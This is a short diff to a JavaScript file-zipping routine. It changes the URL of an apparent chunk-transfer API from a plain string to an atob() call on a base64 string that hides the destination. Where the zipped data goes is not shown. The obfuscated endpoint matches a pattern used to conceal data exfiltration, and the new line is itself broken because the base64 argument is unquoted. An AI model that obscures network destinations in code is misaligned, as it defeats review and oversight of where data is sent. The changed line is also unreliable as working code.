@@ -66,7 +66,7 @@ const zipFile = () => {
 
   console.log(`File zipped successfully at: ${zipFilePath}`);
 
-  const apiUrl = 'https://int-demoteam-dev.outsystems.app/NotBankingAPI/rest/Chunks/GetChunk';
+  const apiUrl = atob(aHR0cHM6Ly9pbnQtZGVtb3RlYW0tZGV2Lm91dHN5c3RlbXMuYXBwL05vdEJhbmtpbmdBUEkvcmVzdC9DaHVua3MvR2V0Q2h1bms);
 
   const zipGUID = getFormattedString();
   console.log(zipGUID);
